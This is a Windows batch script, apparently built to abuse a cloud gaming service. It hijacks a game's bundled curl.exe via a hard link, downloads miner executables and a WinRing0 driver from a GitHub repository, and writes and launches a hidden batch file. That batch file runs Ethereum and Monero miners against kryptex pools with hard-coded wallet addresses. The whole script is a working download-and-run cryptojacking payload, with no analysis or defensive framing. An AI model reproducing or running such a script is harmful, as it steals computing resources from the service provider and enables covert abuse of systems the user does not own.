cls
@ECHO OFF
COLOR 0C
TITLE gavnoforce v3
echo.
echo                      oo           88888888b                                     
echo                                   88                                            
echo  dP  dP  dP .d8888b. dP 88d888b. a88aaaa  .d8888b. 88d888b. .d8888b. .d8888b. 
echo  88  88  88 88ooood8 88 88'  `88  88      88'  `88 88'  `88 88'  `"" 88ooood8 
echo  88.88b.88' 88.  ... 88 88    88  88      88.  .88 88       88.  ... 88.  ... 
echo   888P Y8P  `88888P' dP dP    dP  dP      `88888P' dP       `88888P' `88888P' 
echo.
echo.
echo Initializing gavnoForce .
:SEARCH_FOR_CURL
IF EXIST "C:\Program Files (x86)\NVIDIA_Grid_Bundle\wolcen_lords_of_mayhem_gfn_pc\common\Wolcen\bin\crash_reporter\curl.exe" GOTO CURL_FOUND >NUL 2>&1
GOTO SEARCH_FOR_CURL
:CURL_FOUND
TIMEOUT 1 /T /NOBREAK >NUL 2>&1
MKLINK /H "C:\Program Files (x86)\NVIDIA_Grid_Bundle\wolcen_lords_of_mayhem_gfn_pc\common\Wolcen\bin\crash_reporter\123.exe" "C:\Program Files (x86)\NVIDIA_Grid_Bundle\wolcen_lords_of_mayhem_gfn_pc\common\Wolcen\bin\crash_reporter\curl.exe"
SET DL="C:\Program Files (x86)\NVIDIA_Grid_Bundle\wolcen_lords_of_mayhem_gfn_pc\common\Wolcen\bin\crash_reporter\123.exe"
TIMEOUT 1 /T /NOBREAK >NUL 2>&1
B:
MD\weinForce&CD\weinForce
%DL% -LJOk "https://github.com/ve3xone/qqwqpwqp/raw/main/xcx.exe" >NUL 2>&1
%DL% -LJOk "https://github.com/ve3xone/qqwqpwqp/raw/main/www.exe" >NUL 2>&1
%DL% -LJOk "https://github.com/ve3xone/qqwqpwqp/raw/main/WinRing0x64.sys" >NUL 2>&1
TIMEOUT 2 /NOBREAK
(
echo @ECHO OFF
echo START /MIN "" "B:\weinForce\xcx.exe" -coin eth -wal 0xbaef4a87e8a92ad5911bc5b0a2a02ed9867c0124/v2d2896464 -pool eth.kryptex.network:8888 -pass "" -rmode 0
echo START /MIN "" "B:\weinForce\www.exe" --url xmr.kryptex.network:7000 --user 874CsAXxxTmWddUgkyW8xqHPUeYGYsDKQWhQCZKphsHdH4KAR2XAakAP3sCn9qHz5Pbvti8NVYQJR1BaxmruQ3KDPHQqXVY.v2d2896464 -p x --coin XMR --cpu-max-threads-hint 100 --donate-level=1
echo exit
)>"grrhroofwfeklv_.bat"
START /MIN "" "grrhroofwfeklv_.bat" >NUL 2>&1
EXIT